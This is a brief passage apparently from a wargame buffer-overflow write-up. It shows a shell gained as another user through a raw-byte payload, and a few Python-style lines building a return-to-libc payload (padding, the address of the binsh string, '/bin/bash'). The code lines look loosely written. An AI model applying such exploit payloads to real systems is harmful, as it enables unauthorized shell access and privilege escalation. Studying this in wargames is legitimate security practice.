...
릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?♦펶뙁\?$?릱릱H??bin/bash
welcome to the DO!
welcome to the GYE!
welcome to the GUL!
welcome to the YUT!
welcome to the MO!
bash: /home/zombie_assassin/.bashrc: Permission denied
bash$ id
...
#target = "/home/zombie_assassin/auccubus"
...
payload = append(p32(padding))		# MO ret
payload = append(p32(binsh_addr))	# system arg
payload = append("/bin/bash")
